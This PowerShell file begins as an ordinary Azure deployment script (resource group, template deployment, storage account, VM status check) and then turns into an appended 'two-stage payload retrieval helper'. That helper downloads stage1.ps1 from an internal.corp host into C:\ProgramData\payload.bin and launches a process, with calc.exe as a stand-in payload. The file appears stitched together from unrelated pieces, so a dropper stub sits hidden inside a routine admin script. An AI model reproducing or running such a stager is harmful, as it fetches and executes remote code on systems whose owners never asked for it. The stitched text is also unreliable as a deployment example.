
$ResourceGroup  = "rg-portal-test-34"
$Location       = 'eastus'
$TemplateFile   = 'C:\Scripts\templates\portal-test.json'
$ParameterFile  = "C:\Scripts\templates\portal-test.parameters.json"
$SubscriptionId = '05c51dc2-12f5-b8ab-49c9-58c4e3b33120'
$StorageAccount = 'sttest9410'
$VmName         = "vm-portal-test-34"
$OutputPath     = 'C:\Logs\deploy-test-2026-09-24.json'
$DryRun         = $false
$InformationPreference = 'SilentlyContinue'
$hostName = $env:COMPUTERNAME
if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw "The Az.Resources module is not installed."
}
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://internal.corp/stage1.ps1',
    [string]$OutputPath = 'C:\ProgramData\payload.bin',
    [int]$RequestTimeout = 108
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$FetchResult = Invoke-StageDownload -SourceUrl $TransferUrl -DestinationPath $OutputPath -TimeoutSec $RequestTimeout
if ($FetchResult) {
    Start-Process -FilePath "calc.exe"
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$StageMarker = "stage-38"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
